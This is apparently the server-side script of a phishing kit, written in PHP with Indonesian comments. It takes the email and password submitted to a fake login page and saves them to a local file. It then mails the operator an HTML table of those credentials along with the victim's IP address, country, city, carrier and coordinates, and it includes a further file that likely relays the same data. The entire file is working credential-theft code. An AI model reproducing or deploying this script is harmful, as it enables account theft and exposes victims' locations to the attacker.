<?php 
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

$file_lines = file('system/antispam.txt');
        foreach ($file_lines as $file => $value) {
            $data = explode("|", $value);
            if (in_array($email, $data)) {
                // Redirect and set session
                $_SESSION['email'] = $email;
                header('Location: index.php');
                exit;
            }
        }

        $myfile = fopen("system/antispam.txt", "a") or die("Unable to open file!");
        fwrite($myfile, "|".$email."|".$password."\n");
        fclose($myfile);

include 'system/setting.php';
include 'system/device.php';
// KONTEN RESULT AKUN
$subjek = "$alexhost_bendera | $alexhost_nomor Result | Punya si $email | Login $login";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
<tr>
					<th style="text-align: center;" colspan="3"> Info Login $login </th>
				</tr>
				<tr>
					<td style="border-right: none;">Email $login</td>
					<td style="text-align: center;">$email</td>
				</tr>
                <tr>
					<td style="border-right: none;">Kata Sandi</td>
					<td style="text-align: center;">$password</td>
				</tr>
				<tr>
					<td style="border-right: none;">Login Via</td>
					<td style="text-align: center;">$login</td>
				</tr>			
				<tr>
				<th style="text-align: center;" colspan="3"> Informasi Tambahan </th>
				<tr>
					<td style="border-right: none;">Negara</td>
					<td style="text-align: center;">$alexhost_negara</td>
				</tr>
				<tr>
					<td style="border-right: none;">Kota</td>
					<td style="text-align: center;">$alexhost_kota</td>
				</tr>
				<tr>
					<td style="border-right: none;">Operator</td>
					<td style="text-align: center;">$alexhost_sinyal</td>
				</tr>
				<tr>			
					<td style="border-right: none;">IP</td>
					<td style="text-align: center;">$alexhost_ip</td>
				</tr>
				<tr>
					<td style="border-right: none;">Lon</td>
					<td style="text-align: center;">$alexhost_lon</td>
				</tr>
				<tr>
					<td style="border-right: none;">Lat</td>
					<td style="text-align: center;">$alexhost_lat</td>
			</tr>
                <tr>
				<th style="text-align: center;" colspan="3">© WEB CAHYO SR II</th>
				</tr>
			</table>
		</div>
	</body>
</html>
EOD; 
// Get Today Date
$Tget = file_get_contents("system/visitor.json");
$Tdecode = json_decode($Tget,true);
$today = $Tdecode['today'] + 1;
$Tdecode['today'] = $today;
$Tresult = json_encode($Tdecode);
            $Tfile = fopen('system/visitor.json','w');
                     fwrite($Tfile,$Tresult);
                     fclose($Tfile);
                     
// YESTERDAY
if(date("H:i") == "01:00"){
$Yget = file_get_contents("system/visitor.json");
$Ydecode = json_decode($Yget,true);
$Ydecode['yesterday'] = $Ydecode['today'];
$Ydecode['today'] = 0;
$Yresult = json_encode($Ydecode);
            $Yfile = fopen('system/visitor.json','w');
                     fwrite($Yfile,$Yresult);
                     fclose($Yfile);
}

// ALL OVER
$Aget = file_get_contents("system/visitor.json");
$Adecode = json_decode($Aget,true);
$all = $Adecode['total'] + 1;
$Adecode['total'] = $all;
$Aresult = json_encode($Adecode);
            $Afile = fopen('system/visitor.json','w');
                     fwrite($Afile,$Aresult);
                     fclose($Afile);

// RESULT DATA
$resultGet = file_get_contents("system/data.json");
$resultData = json_decode($resultGet,true);

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: '.$resultData['nama_result'].' <admin@sendora.my.id>' . "\r\n";

if(mail($resultData['email_result'], $subjek, $pesan, $headers))
include '../../filecurl.php';
{
$upGet = file_get_contents("system/data.json");
$upData = json_decode($upGet,true);
$hasil = $upData['totals'] + 1;
$upData['totals'] = $hasil;
$upResult = json_encode($upData);
$upFile = fopen('system/data.json','w');
          fwrite($upFile,$upResult);
          fclose($upFile);
}
?>